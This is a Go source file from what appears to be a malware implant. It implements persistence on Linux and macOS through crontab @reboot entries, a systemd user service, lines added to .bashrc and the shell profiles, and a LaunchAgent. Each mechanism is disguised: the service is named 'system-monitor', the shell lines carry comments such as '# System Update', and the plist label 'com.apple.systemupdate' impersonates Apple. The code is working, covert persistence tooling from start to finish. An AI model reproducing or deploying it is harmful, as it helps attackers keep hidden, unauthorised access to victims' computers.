//go:build !windows
// +build !windows

package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	PersistMethodCron      = "cron"
	PersistMethodSystemd   = "systemd"
	PersistMethodBashrc    = "bashrc"
	PersistMethodProfile   = "profile"
	PersistMethodLaunchd   = "launchd" // macOS
)

// PersistenceInfo contains information about an installed persistence mechanism
type PersistenceInfo struct {
	Method      string `json:"method"`
	Location    string `json:"location"`
	Description string `json:"description"`
	Installed   bool   `json:"installed"`
}

// InstallPersistence installs persistence using the specified method
func (i *Implant) InstallPersistence(method string) ([]byte, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("failed to get executable path: %v", err)
	}

	var result PersistenceInfo
	result.Method = method

	switch method {
	case PersistMethodCron:
		err = i.installCronPersistence(exePath)
		result.Location = "/var/spool/cron or crontab"
		result.Description = "Cron job persistence"

	case PersistMethodSystemd:
		err = i.installSystemdPersistence(exePath)
		result.Location = "systemd user service"
		result.Description = "Systemd service persistence"

	case PersistMethodBashrc:
		err = i.installBashrcPersistence(exePath)
		result.Location = "~/.bashrc"
		result.Description = "Bashrc persistence"

	case PersistMethodProfile:
		err = i.installProfilePersistence(exePath)
		result.Location = "~/.profile or ~/.bash_profile"
		result.Description = "Shell profile persistence"

	case PersistMethodLaunchd:
		if runtime.GOOS == "darwin" {
			err = i.installLaunchdPersistence(exePath)
			result.Location = "~/Library/LaunchAgents"
			result.Description = "macOS LaunchAgent persistence"
		} else {
			return nil, fmt.Errorf("launchd is only available on macOS")
		}

	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}

	if err != nil {
		result.Installed = false
		return json.Marshal(map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
			"info":   result,
		})
	}

	result.Installed = true
	return json.Marshal(map[string]interface{}{
		"status": "success",
		"info":   result,
	})
}

// RemovePersistence removes persistence using the specified method
func (i *Implant) RemovePersistence(method string) ([]byte, error) {
	var err error

	switch method {
	case PersistMethodCron:
		err = i.removeCronPersistence()
	case PersistMethodSystemd:
		err = i.removeSystemdPersistence()
	case PersistMethodBashrc:
		err = i.removeBashrcPersistence()
	case PersistMethodProfile:
		err = i.removeProfilePersistence()
	case PersistMethodLaunchd:
		err = i.removeLaunchdPersistence()
	default:
		return nil, fmt.Errorf("unknown persistence method: %s", method)
	}

	if err != nil {
		return json.Marshal(map[string]interface{}{
			"status": "error",
			"error":  err.Error(),
			"method": method,
		})
	}

	return json.Marshal(map[string]interface{}{
		"status": "success",
		"method": method,
	})
}

// ListPersistence lists all installed persistence mechanisms
func (i *Implant) ListPersistence() ([]byte, error) {
	mechanisms := []PersistenceInfo{
		i.checkCronPersistence(),
		i.checkSystemdPersistence(),
		i.checkBashrcPersistence(),
		i.checkProfilePersistence(),
	}

	if runtime.GOOS == "darwin" {
		mechanisms = append(mechanisms, i.checkLaunchdPersistence())
	}

	return json.Marshal(map[string]interface{}{
		"persistence": mechanisms,
	})
}

// installCronPersistence installs cron job persistence
func (i *Implant) installCronPersistence(exePath string) error {
	// Add cron job using crontab command
	cronEntry := fmt.Sprintf("@reboot %s &\n", exePath)

	// Get existing crontab
	output, err := i.ExecuteShell("crontab", []string{"-l"})
	existingCrontab := string(output)

	// Check if entry already exists
	if strings.Contains(existingCrontab, exePath) {
		return nil // Already installed
	}

	// Add new entry
	newCrontab := existingCrontab + cronEntry

	// Write to temp file
	tmpFile, err := ioutil.TempFile("", "crontab_")
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile.Name())

	if err := ioutil.WriteFile(tmpFile.Name(), []byte(newCrontab), 0600); err != nil {
		return err
	}

	// Install new crontab
	_, err = i.ExecuteShell("crontab", []string{tmpFile.Name()})
	return err
}

// removeCronPersistence removes cron persistence
func (i *Implant) removeCronPersistence() error {
	exePath, _ := os.Executable()

	output, err := i.ExecuteShell("crontab", []string{"-l"})
	if err != nil {
		return err
	}

	lines := strings.Split(string(output), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, exePath) {
			newLines = append(newLines, line)
		}
	}

	newCrontab := strings.Join(newLines, "\n")

	tmpFile, err := ioutil.TempFile("", "crontab_")
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile.Name())

	if err := ioutil.WriteFile(tmpFile.Name(), []byte(newCrontab), 0600); err != nil {
		return err
	}

	_, err = i.ExecuteShell("crontab", []string{tmpFile.Name()})
	return err
}

// checkCronPersistence checks if cron persistence is installed
func (i *Implant) checkCronPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodCron,
		Location:    "crontab",
		Description: "Cron job persistence",
		Installed:   false,
	}

	exePath, _ := os.Executable()
	output, err := i.ExecuteShell("crontab", []string{"-l"})
	if err == nil && strings.Contains(string(output), exePath) {
		info.Installed = true
	}

	return info
}

// installSystemdPersistence installs systemd user service persistence
func (i *Implant) installSystemdPersistence(exePath string) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	serviceDir := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user")
	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return err
	}

	serviceName := "system-monitor.service"
	servicePath := filepath.Join(serviceDir, serviceName)

	serviceContent := fmt.Sprintf(`[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
`, exePath)

	if err := ioutil.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}

	// Enable and start the service
	i.ExecuteShell("systemctl", []string{"--user", "daemon-reload"})
	i.ExecuteShell("systemctl", []string{"--user", "enable", serviceName})
	i.ExecuteShell("systemctl", []string{"--user", "start", serviceName})

	return nil
}

// removeSystemdPersistence removes systemd persistence
func (i *Implant) removeSystemdPersistence() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	serviceName := "system-monitor.service"
	serviceDir := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user")
	servicePath := filepath.Join(serviceDir, serviceName)

	i.ExecuteShell("systemctl", []string{"--user", "stop", serviceName})
	i.ExecuteShell("systemctl", []string{"--user", "disable", serviceName})

	return os.Remove(servicePath)
}

// checkSystemdPersistence checks if systemd persistence is installed
func (i *Implant) checkSystemdPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodSystemd,
		Location:    "~/.config/systemd/user",
		Description: "Systemd user service persistence",
		Installed:   false,
	}

	currentUser, _ := user.Current()
	if currentUser == nil {
		return info
	}

	serviceName := "system-monitor.service"
	serviceDir := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user")
	servicePath := filepath.Join(serviceDir, serviceName)

	if _, err := os.Stat(servicePath); err == nil {
		info.Installed = true
	}

	return info
}

// installBashrcPersistence installs bashrc persistence
func (i *Implant) installBashrcPersistence(exePath string) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	bashrcPath := filepath.Join(currentUser.HomeDir, ".bashrc")
	persistLine := fmt.Sprintf("\n# System Update\n%s &\n", exePath)

	// Read existing bashrc
	content, err := ioutil.ReadFile(bashrcPath)
	if err != nil {
		content = []byte{}
	}

	// Check if already present
	if strings.Contains(string(content), exePath) {
		return nil
	}

	// Append persistence line
	newContent := string(content) + persistLine

	return ioutil.WriteFile(bashrcPath, []byte(newContent), 0644)
}

// removeBashrcPersistence removes bashrc persistence
func (i *Implant) removeBashrcPersistence() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	exePath, _ := os.Executable()
	bashrcPath := filepath.Join(currentUser.HomeDir, ".bashrc")

	content, err := ioutil.ReadFile(bashrcPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, exePath) {
			newLines = append(newLines, line)
		}
	}

	return ioutil.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

// checkBashrcPersistence checks if bashrc persistence is installed
func (i *Implant) checkBashrcPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodBashrc,
		Location:    "~/.bashrc",
		Description: "Bashrc persistence",
		Installed:   false,
	}

	currentUser, _ := user.Current()
	if currentUser == nil {
		return info
	}

	exePath, _ := os.Executable()
	bashrcPath := filepath.Join(currentUser.HomeDir, ".bashrc")

	content, err := ioutil.ReadFile(bashrcPath)
	if err == nil && strings.Contains(string(content), exePath) {
		info.Installed = true
	}

	return info
}

// installProfilePersistence installs shell profile persistence
func (i *Implant) installProfilePersistence(exePath string) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	profiles := []string{".profile", ".bash_profile", ".zshrc"}
	persistLine := fmt.Sprintf("\n# System Process\n%s &\n", exePath)

	for _, profile := range profiles {
		profilePath := filepath.Join(currentUser.HomeDir, profile)

		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		content, _ := ioutil.ReadFile(profilePath)
		if strings.Contains(string(content), exePath) {
			return nil // Already installed
		}

		newContent := string(content) + persistLine
		if err := ioutil.WriteFile(profilePath, []byte(newContent), 0644); err == nil {
			return nil
		}
	}

	return fmt.Errorf("no profile files found")
}

// removeProfilePersistence removes profile persistence
func (i *Implant) removeProfilePersistence() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	exePath, _ := os.Executable()
	profiles := []string{".profile", ".bash_profile", ".zshrc"}

	for _, profile := range profiles {
		profilePath := filepath.Join(currentUser.HomeDir, profile)

		content, err := ioutil.ReadFile(profilePath)
		if err != nil {
			continue
		}

		lines := strings.Split(string(content), "\n")
		var newLines []string
		for _, line := range lines {
			if !strings.Contains(line, exePath) {
				newLines = append(newLines, line)
			}
		}

		ioutil.WriteFile(profilePath, []byte(strings.Join(newLines, "\n")), 0644)
	}

	return nil
}

// checkProfilePersistence checks if profile persistence is installed
func (i *Implant) checkProfilePersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodProfile,
		Location:    "~/.profile, ~/.bash_profile, ~/.zshrc",
		Description: "Shell profile persistence",
		Installed:   false,
	}

	currentUser, _ := user.Current()
	if currentUser == nil {
		return info
	}

	exePath, _ := os.Executable()
	profiles := []string{".profile", ".bash_profile", ".zshrc"}

	for _, profile := range profiles {
		profilePath := filepath.Join(currentUser.HomeDir, profile)
		content, err := ioutil.ReadFile(profilePath)
		if err == nil && strings.Contains(string(content), exePath) {
			info.Installed = true
			break
		}
	}

	return info
}

// installLaunchdPersistence installs macOS LaunchAgent persistence
func (i *Implant) installLaunchdPersistence(exePath string) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	launchAgentDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")
	if err := os.MkdirAll(launchAgentDir, 0755); err != nil {
		return err
	}

	plistName := "com.apple.systemupdate.plist"
	plistPath := filepath.Join(launchAgentDir, plistName)

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, exePath)

	if err := ioutil.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return err
	}

	// Load the launch agent
	i.ExecuteShell("launchctl", []string{"load", plistPath})

	return nil
}

// removeLaunchdPersistence removes macOS LaunchAgent persistence
func (i *Implant) removeLaunchdPersistence() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	plistName := "com.apple.systemupdate.plist"
	launchAgentDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")
	plistPath := filepath.Join(launchAgentDir, plistName)

	i.ExecuteShell("launchctl", []string{"unload", plistPath})

	return os.Remove(plistPath)
}

// checkLaunchdPersistence checks if LaunchAgent persistence is installed
func (i *Implant) checkLaunchdPersistence() PersistenceInfo {
	info := PersistenceInfo{
		Method:      PersistMethodLaunchd,
		Location:    "~/Library/LaunchAgents",
		Description: "macOS LaunchAgent persistence",
		Installed:   false,
	}

	currentUser, _ := user.Current()
	if currentUser == nil {
		return info
	}

	plistName := "com.apple.systemupdate.plist"
	launchAgentDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")
	plistPath := filepath.Join(launchAgentDir, plistName)

	if _, err := os.Stat(plistPath); err == nil {
		info.Installed = true
	}

	return info
}
